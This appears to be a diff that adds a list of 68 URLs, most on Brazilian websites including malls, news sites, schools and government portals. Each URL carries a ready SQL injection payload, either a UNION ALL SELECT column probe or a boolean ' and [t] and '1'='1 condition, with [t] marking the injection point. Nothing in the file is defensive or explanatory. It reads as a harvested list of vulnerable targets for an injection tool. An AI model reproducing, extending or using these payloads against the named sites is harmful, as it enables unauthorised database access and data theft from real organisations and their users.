@@ -1,0 +1,68 @@
+https://www.diocesecachoeiro.org.br/ler.asp?codigo=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12
+http://www.veterinariaxandaine.com.br/artigo.php?id=999999.9 union all select 1,[t],3,4,5,6
+http://www.portalsulshopping.com.br/lojas/grava-destino.asp?destino=469' and [t] and '1'='1
+https://www.loja-electronic.com/index.php?route=product%2Fproduct&product_id=60' and [t] and '1'='1
+http://clam.org.br/destaque/conteudo.asp?cod=999999.9 union all select [t],2,3,4,5,6,7,8,9,10,11,12,13,14,15
+http://www.green-aduaneira.com.br/index2.asp?secao=[t]
+https://teresinashopping.com.br/lojas/grava-destino.asp?destino=160' and [t] and '1'='1
+http://www.mall.com.br/uptownbarra/lojas/grava-destino.asp?destino=421' and [t] and '1'='1
+http://www.fafamapa.com.br/pagina.php?pg=exibir_not&idnoticia=7556999999.9' union all select 1,2,3,4,5,[t],7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 and '0'='0
+https://www.bluetree.com.br/m/apartamento.asp?pacote=[t]&volta=pacotes.asp&promocao=4139
+https://exclusivaautoescola.com.br/detalheServico.php?id=3999999.9' union all select 1,[t],3,4,5 and '0'='0
+http://www.leonimoveis.com.br/noticias.php?id=999999.9 union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13
+http://www.hslg.com.br/index.php?action=paginas&target=999999.9 union all select 1,[t],3,4,5,6
+http://bancariosrr.com.br/conteudo.php?action=artigos&codigo=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16
+http://www.jornalofarol.com.br/ver-noticia.asp?codigo=42581' and [t] and '1'='1
+https://aracatuba.sp.gov.br/turismo/item.php?item=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
+https://upaupaalegria.com.br/brinquedo.php?id=999999.9' union all select 1,[t],3,4,5,6,7,8,9,10 and '0'='0
+http://educonse.com.br/xcoloquio/cdanais.asp?id=913' and [t] and '1'='1
+http://nectardobrasil.com.br/profissional/ver.php?id_produto=999999.9' union all select 1,2,3,[t],5,6,7,8,9,10,11 and '0'='0
+https://www.riodasostras.com.br/eventos/index.php?evento=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
+http://proweb.procergs.com.br/visualiza_justificativa.asp?SiglaTipo=PL+&NroProposicao=[t]&AnoProposicao=2004
+http://www.codesavi.com.br/imprime.php?id=999999.9 union all select 1,2,3,4,5,6,7,8,[t],10,11,12,13
+https://brasilparkshopping.com.br/grava-destino.asp?destino=560' and [t] and '1'='1
+https://noticiacapital.com.br/noticias1.asp?cod=[t]
+https://www.fabesul.com.br/fabesul/Webforms/produto.aspx?cpro=[t]
+http://www.scirecontabilidade.com.br/servicos.asp?cd=999999.9 union all select 1,2,3,4,[t],6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+http://www.momento.com.br/pt/imprimir.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12
+https://inconfidenciaautoescola.com.br/detalheServico.php?id=3999999.9' union all select 1,[t],3,4,5,6 and '0'='0
+https://www.nutricaoempauta.com.br/lista_artigo.php?cod=[t]
+http://www.mlabrs.com.br/site/produtos_mlab.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8&categoria=8
+http://catolicismo.com.br/materia/materia.cfm?IDmat=DCCE1D14-3048-313C-2EEA314C62904465&mes=Junho1993&pag=[t]
+http://www.netcpa.com.br/MostraConteudoBusca.asp?ID=586' or 1=[t] and '1'='1&CodigoTabela=14
+https://www.aeromercado.com.br/getaeroA20.asp?id=[t]&tipo=Multi&marca=PIPER&familia=SENECA+II&modelo=PA-34
+https://westplaza.com.br/vitrine-online/produto.asp?produto=786' and [t] and '1'='1
+https://www.jbra.com.br/trab/pub/edicoes.php?ano=2022&numero=999999.9 union all select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,[t]--
+https://www.lubeck.com.br/en/index.php?id=1&page=Social+Responsability' and [t] and '1'='1&grupo=institutional
+https://sistemas.anm.gov.br/publicacao/mostra_imagem.asp?idbancoarquivoarquivo=[t]
+http://www.rioecultura.com.br/expo/expo_resultado2.asp?expo_cod=1798' and [t] and '1'='1
+https://garraautoescola.com.br/blog-single.php?id=1999999.9' union all select 1,2,3,[t],5,6,7 and '0'='0
+http://projetoslabex.com.br/index.php?action=themes%2Flabex%2Fnav%2Fpage_noticias&id=999999.9' union all select 1,[t],3,4,5,6,7,8 and '0'='0
+https://caerd-ro.com.br/noticias.php?id=850999999.9' union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 and '0'='0
+http://www.manaca.com.br/index.asp?title=&tipo=[t]&p=9
+http://cobbmale.com.br/es/mostraConteudo.php/?uid=4AE22A84-A2A1-41E0-800D-942A7520C735' or 1=[t] and '1'='1&slug=cobb-vantress-demuestra-mejor-desempeno-en-campo-con-cobbmale
+https://buritishopping.com.br/grava-destino.asp?destino=1001' and [t] and '1'='1
+http://www.caminhosluz.com.br/detalhe_imprimir.asp?txt=999999.9 union all select [t],2,3
+https://www.supeerp.com.br/forum/display_topic_threads.asp?ForumID=22&TopicID=[t]&PagePosition=1
+http://www.webkits.com.br/fotos/gallery.asp?action=viewimage&categoryid=[t]&text=&imageid=4407&box=&shownew=
+http://colegioinovar.com/index.php?pg=mod.noticias&acao=unico&id=30' and [t] and '1'='1
+http://www.abavrio.com.br/associados_agencia.asp?a=[t]
+http://resortsbrasil.net.br/index.php?url=jatiuca-hoteis-resorts&item=999999.9 union all select [t]
+http://www.indoviajar.com.br/brasil/estado.asp?estado=999999.9 union all select 1,2,3,[t],5,6
+https://www.brasilplanet.com.br/turismobrasil/Fortaleza/Fortaleza_at%C3%A9_S%C3%A3o_Luis_de_4x4_A_Rota_das_Emo%C3%A7%C3%B5es/Fortaleza_at%C3%A9_S%C3%A3o_Luis_de_4x4_A_Rota_das_Emo%C3%A7%C3%B5es_19.asp?changnaz=[t]
+https://unigra.com.br/conta.php?ebook=educacao-fisica%2C-lazer-e-saude%3A-desafios-interdisciplinares-na-promocao-da-atividade-fisica-volume-ii-.pdf&id=[t]
+https://buritishoppingmogiguacu.com.br/grava-destino.asp?destino=937' and [t] and '1'='1
+https://www.morumbitown.com.br/lojas/grava-destino.asp?destino=606' and [t] and '1'='1
+https://www.radiodanubioazul.com.br/noticia.aspx?t=lula-diz-que-psdb-acabou-e-partido-rebate-porque-a-gestao-do-pt-quase-acabou-com-o-brasil' and [t] and '1'='1
+http://www.santannaesantanna.com.br/textos.aspx?title=Responsabilidade+objetiva+entre+m%C3%A9dico+e+hospital999999.9' union all select [t],2,3 and '0'='0
+http://www.oserrano.com.br/autredir.asp?id=90' or 1=[t] and '1'='1
+http://www.infocarro.com.br/detalhes.asp?id=[t]&carro-chevrolet-cruze-sedan-1.8-16v-4p-lt-ecotec-flex-autom%25E1tico-2013
+http://localrj.com.br/ficha.aspx?cod=LOL033.006' or 1=[t] and '1'='1
+http://www.moveisfunari.com.br/cat.php?id=12999999.9' union all select 1,[t],3 and '0'='0
+http://credisa.com.br/vernoticia.php?id=11999999.9' union all select 1,[t],3,4 and '0'='0
+https://www.colegiosouzagouveia.com.br/detalheBlog.php?id=21999999.9' union all select 1,2,3,4,5,6,[t],8 and '0'='0
+https://jornaldepicos.com.br/noticia_detalhe.php?id=999999.9' union all select 1,2,[t],4,5,6,7,8,9,10 and '0'='0
+https://www.turismobage.com.br/pontos.php?id=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10
+http://www.sindaeb.com.br/hp/dt_noticias.php?id=999999.9 union all select 1,2,[t],4,5,6,7,8,9,10,11,12
+http://hallconsult.com.br/ler_noticia.php?id=999999.9' union all select 1,[t],3,4,5,6,7 and '0'='0
+http://www.insertecam.com.br/listar_secao.php?sec=999999.9 union all select [t],2,3,4,5,6
